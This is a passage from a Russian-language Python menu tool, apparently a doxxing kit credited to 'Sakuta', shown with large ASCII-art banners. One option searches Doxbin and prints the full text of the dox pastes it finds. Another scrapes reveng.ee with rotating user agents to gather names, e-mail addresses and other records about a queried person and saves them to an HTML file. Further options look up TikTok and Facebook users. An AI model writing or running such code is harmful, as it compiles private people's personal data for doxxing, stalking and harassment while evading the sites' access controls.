⠀⠀⠀⠀⠀⢀⣾⠁⢠⣿⣿⠁⠀⢸⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡇⠀⢸⣿⣷⡀⠘⣷⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣾⠃⢀⣿⣿⣿⠀⠀⢸⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡇⠀⢸⣿⣿⣧⠀⠸⣧⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣰⡏⠀⣼⣿⣿⣿⠀⠀⢸⡇⠀⠀⠀⠀⠀⣀⣤⣴⠶⠛⠛⠛⠛⠙⠛⠛⠛⠛⠶⢦⣤⣀⠀⠀⠀⠀⠀⣸⠇⠀⣸⣿⣿⣿⡇⠀⢿⡆⠀⠀⠀⠀
⠀⠀⠀⠀⣿⠃⠀⣿⣿⣿⣿⣧⠀⠀⢻⡄⢀⣤⠶⠛⢉⣀⣤⣴⣶⣶⣶⣶⣶⣶⣶⣶⣶⣤⣄⣀⠉⠛⠶⣤⡀⢠⡟⠀⢀⣿⣿⣿⣿⣷⠀⢸⡇⠀⠀⠀⠀
⣶⣶⣴⡆⣿⠀⠀⣿⣿⣿⣿⣿⣧⡀⠀⠛⠋⢁⣤⣀⣙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣉⣤⣄⡈⠙⠿⠀⢠⣿⣿⣿⣿⣿⣿⠀⢸⡇⠀⣠⠀⠀
⣿⠀⢹⣇⣿⡄⠀⣿⣿⣿⣿⣿⣿⣿⣦⣄⣀⡈⠉⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠉⠉⢁⣀⣠⣾⣿⣿⣿⣿⣿⣿⡿⠀⢸⣧⣰⠏⠀⡄
⣿⠀⢀⠹⣿⣧⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⢺⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⢀⣿⣿⠏⠀⢀⡟
⣿⡄⢻⣆⠘⢿⣇⠀⠹⣿⣿⣿⣿⣿⣿⢿⣿⠋⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠻⣿⠟⣹⣿⣿⣿⣿⣿⠋⠀⣼⡿⢃⣴⠟⢸⡇
⢿⡇⠀⣿⣷⣄⠙⢷⣄⠈⠻⢿⣿⡿⠿⠟⠁⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠙⠿⠿⠿⠿⠛⠋⠁⣠⡾⠋⣠⣿⢇⠀⣼⠇
⠈⣿⠀⣿⡟⢿⣷⡀⠉⠓⣤⣤⣤⣤⣤⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣤⣀⣤⣤⡴⠾⢏⣰⣿⠟⣱⡟⢡⡟⠀
⠀⢹⣆⠘⣿⣦⡉⠻⠗⠂⣿⣿⣿⣿⡟⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠛⣿⣿⣿⣿⣷⠀⣿⠛⢡⣤⣿⠁⣸⠇⠀
⠀⠀⢿⡄⢻⣿⣧⣶⣤⡀⠙⣿⣿⣿⣥⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⣿⣿⣇⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣼⣿⣿⡿⡇⣠⣴⣾⣿⣿⠇⢠⡿⠀⠀
⠀⠀⠈⢷⡈⠻⣿⣿⣿⣿⡆⢸⣿⡿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⡏⠀⢸⣿⣿⣿⡿⠋⢠⡾⠁⠀⠀
⠀⠀⠀⠀⠻⢦⡈⠻⢿⣿⠀⣸⣿⣿⣶⣄⠀⠈⢙⡛⠻⢿⣿⣿⣿⣿⢸⣿⣿⣿⠉⣿⣿⣿⣿⠿⠟⢛⡉⠁⢀⣴⣾⣿⣿⡆⠸⣿⣿⠋⣀⡴⠏⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⢷⣄⠀⣼⣿⣿⣿⣿⣿⣷⣦⡘⠛⠷⠶⠀⠉⠛⣛⢺⣿⣿⣿⠀⠿⠛⠉⠠⠶⠾⠛⣃⣴⣿⣿⣿⣿⣿⣿⡄⠉⣹⡾⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢻⡆⠛⢿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣷⣶⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⣰⡟⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣦⠀⠙⢿⣿⡿⠿⠛⢻⣛⣻⣿⣿⣿⣿⡿⣿⣿⣿⣿⡿⣽⣿⣿⣿⣿⣛⣛⠛⠻⠿⣿⣿⡿⠋⢀⣼⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⣄⠈⠻⣿⣦⣀⡈⠻⢿⣿⣿⣿⣿⠃⣼⣿⣿⣿⣇⢸⣿⣿⣿⣿⡿⠋⣀⣀⣼⣿⠋⠀⣴⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡄⠀⣿⣿⣿⣿⣄⠈⠻⣿⣿⡏⠸⣿⣿⣿⣿⡿⠀⣿⣿⡿⠋⠀⣴⣿⣿⣿⡇⠀⣸⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣷⠀⢹⣿⣿⣿⣿⡎⢻⣦⣙⠛⠂⠈⢿⣿⡟⠁⠺⢛⣩⣴⠾⣾⣿⣿⣿⣿⠇⢠⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢳⣄⡈⠙⢿⣿⣿⡄⢙⡛⠻⣿⢶⡼⠟⠠⢾⡿⠛⢟⠁⣰⣿⣿⠟⠉⢀⣴⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠹⣶⡀⠉⢿⣷⡘⢿⣶⣦⣤⣅⣀⣠⣤⣶⣷⡿⢡⣿⡟⠁⢠⣴⠏⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⡄⠈⣿⣷⣤⡉⠛⠻⠿⠿⠿⠟⠛⣉⣴⣿⣿⠀⣠⡞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⣄⠉⠻⣿⣿⣷⣶⣶⣿⣶⣶⣿⣿⣾⠟⠁⣠⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢦⡀⠈⢿⣿⣿⣿⣿⣿⣿⣿⠟⠁⣠⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣦⠀⠻⢿⣿⣿⣿⠿⠋⠀⣴⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⢶⣤⣤⣤⣤⣤⡴⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀""") 
            print("                   Поиск паст по Doxbin \n                        By Sakuta") 
            query = input("Введите запрос для поиска на Doxbin (или '0' для завершения): ").strip()
            if query.lower() == "0":
                print("Скрипт завершен.")
                break

            print("Ищем данные...")
            links, error = search_doxbin(query)
            if error:
                print(error)
                continue

            print("\nНайдено результатов:", len(links))
            print("\nРезультаты поиска:")
            for link in links:
                print("-" * 80)
                print(f"Заголовок: {link['title']}")
                print(f"Ссылка: {link['url']}")
                clean_data = fetch_clean_data(link)
                print(f"Основной текст:\n{clean_data}")
    elif choice == "21":
        USER_AGENTS = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        ]
        BASE_URL = "https://reveng.ee/search?q="
        MAX_PAGES = 10
        def get_random_user_agent():
            return random.choice(USER_AGENTS)
        def extract_emails(text):
            return list(set(re.findall(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}", text)))
        def fetch_page_data(query_encoded, page):
            url = f"{BASE_URL}{query_encoded}&per_page=1000&page={page}"  
            headers = {"User-Agent": get_random_user_agent()}
            try:
                response = requests.get(url, headers=headers, timeout=10)
                response.raise_for_status()
                return BeautifulSoup(response.text, "html.parser")
            except requests.RequestException:
                return None
        def parse_search_results(soup):
            if not soup:
                return []
            links = set()
            for a in soup.find_all("a", href=True):
                if "entity" in a["href"]:
                    links.add(f"https://reveng.ee{a['href']}")
            return list(links)
        def fetch_entity_data(url):
            headers = {"User-Agent": get_random_user_agent()}
            try:
                response = requests.get(url, headers=headers, timeout=10)
                response.raise_for_status()
                soup = BeautifulSoup(response.text, "html.parser")
                entity_data = {"Источник": url}
                entity_section = soup.find("div", class_="bg-body rounded shadow-sm p-3 mb-2 entity-info")
                if not entity_section:
                    return None
                name = entity_section.find("span", class_="entity-prop-value")
                if name:
                    entity_data["Имя"] = name.get_text(strip=True)
                emails = extract_emails(response.text)
                if emails:
                    entity_data["E-mail"] = ", ".join(emails)
                for row in entity_section.find_all("tr", class_="property-row"):
                    key = row.find("td", class_="property-name").get_text(strip=True)
                    value = row.find("td", class_="property-values").get_text(strip=True)
                    entity_data[key] = value
                return entity_data
            except requests.RequestException:
                return None
        def search_info(query):
            query_encoded = quote_plus(query)
            all_links = []
            with ThreadPoolExecutor(max_workers=5) as executor:
                soups = executor.map(fetch_page_data, repeat(query_encoded), range(1, MAX_PAGES + 1))
                for soup in soups:
                    all_links.extend(parse_search_results(soup))
            all_links = list(set(all_links))  
            results = list(filter(None, ThreadPoolExecutor(max_workers=5).map(fetch_entity_data, all_links)))
            return results
        def find_similar_results(results):
            names = [r.get("Имя", "") for r in results]
            similar = set()
            for name in names:
                matches = get_close_matches(name, names, n=3, cutoff=0.8)
                similar.update(matches)
            return list(similar)
        def save_results_to_html(results, similar_results, duration):
            with open("results.html", "w", encoding="utf-8") as f:
                f.write("<html lang='ru'><head><meta charset='UTF-8'><title>Результаты поиска</title></head><body>")
                f.write(f"<h1>Результаты поиска ({len(results)})</h1>")
                f.write(f"<p>Поиск занял {duration:.2f} секунд</p>")
                if results:
                    f.write("<ul>")
                    for i, result in enumerate(results, 1):
                        f.write(f"<li><strong>Результат {i}:</strong><ul>")
                        for key, value in result.items():
                            f.write(f"<li><strong>{key}:</strong> {value}</li>")
                        f.write("</ul></li>")
                    f.write("</ul>")

                if similar_results:
                    f.write("<h2>Схожие результаты</h2><ul>")
                    for match in similar_results:
                        f.write(f"<li>{match}</li>")
                    f.write("</ul>")

                f.write("</body></html>")
        def format_results(results, similar_results, duration):
            print(f"➤ Найдено {len(results)} результатов")
            for i, result in enumerate(results, 1):
                print(f"\nРезультат {i}:")
                for key, value in result.items():
                    print(f"  {key}: {value}")
            if similar_results:
                print("\n➤ Схожие результаты:")
                for match in similar_results:
                    print(f"  {match}")
            print(f"\n➤ Поиск занял: {duration:.2f} секунд.")
        def searchbd():
            query = input("➤ Введите данные для поиска: ").strip()
            if not query:
                print("➤ Пожалуйста, введите корректные данные.")
                return
            print("➤ Поиск... Пожалуйста, подождите.")
            start_time = time.time()
            results = search_info(query)
            similar_results = find_similar_results(results)
            duration = time.time() - start_time
            format_results(results, similar_results, duration)
            save_results_to_html(results, similar_results, duration)
            input("➤ Нажмите Enter для завершения...")
        searchbd()
    elif choice == "22":
        print("Находится в стадии разработки... \nБудут 2 сервиса для поиска")
    elif choice == "23":
        get_info(username=input(Colorate.Horizontal(Colors.white_to_red, "[+] Введите имя пользователя TikTok: ")))
    elif choice == "24":
        facebook()
    elif choice == '0':
        os.system('cls' if os.name == 'nt' else 'clear')
        color = {
            'black': Fore.BLACK,
            'red': Fore.RED,
            'white': Fore.WHITE,
        }
        Colors.custom = color['black'], color['red'], color['white']
        Anime.Fade(
             Center.Center(f"""\n
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⣶⣶⣶⣿⣾⣷⣿⣾⣷⣶⣶⣶⣤⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣴⣶⣿⣿⣿⣿⡿⠿⠿⠿⠿⠟⠿⠿⠿⠿⣿⣿⣿⣿⣿⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⣶⣴⣤⣶⣾⣿⣿⣿⡿⠟⠛⠉⠉⠀⠀⠀⠀⠀⢀⢀⣀⣀⢀⠀⠀⠀⠀⠉⠙⠛⠿⣿⣿⣿⣷⣶⣤⣄⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠛⠛⠛⠛⠛⠛⠉⠁⠀⠀⢀⣀⣤⣴⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣤⣤⣀⣀⠉⠙⠛⠛⠿⠿⣿⣿⡧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⢀⣀⣠⣴⣶⣾⣿⠿⠟⠋⠉⠁⠸⣿⣿⣿⣿⣿⣿⡇⠉⠛⠻⠿⢿⣿⣿⣿⣿⣷⣶⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢾⣿⣿⣿⣿⣿⣿⡟⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠻⣿⣿⣿⣿⣶⣶⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠻⣿⣿⣷⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⣾⣿⡿⠿⠿⠛⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⠿⣿⣷⣶⣤⣤⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣠⣤⣴⣶⣿⡿⠿⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⡆⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡀⠀⠙⢿⣿⣧⣀⠀⠀⠈⠈⠁⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣧⠀⠀⠀⠙⢿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣷⣦⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢴⣾⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠉⠻⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⣿⣿⣿⣿⠁⠙⢿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠈⠹⢿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⠟⠁⠀⠀⠘⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⠿⣿⣶⣦⣄⡀⠀⠀⠀⠀⠀⢀⣠⣾⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⣿⣿⣿⣿⣤⣧⣼⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠿⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠙⠛⠛⠛⠛⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                 """),
             Colors.custom,
             Colorate.Vertical,
             interval=0.06,
             enter=True
        )
        exit()
    else:
        print(Fore.RED + "[!] Неверный выбор. Пожалуйста, введите 1-2-3.")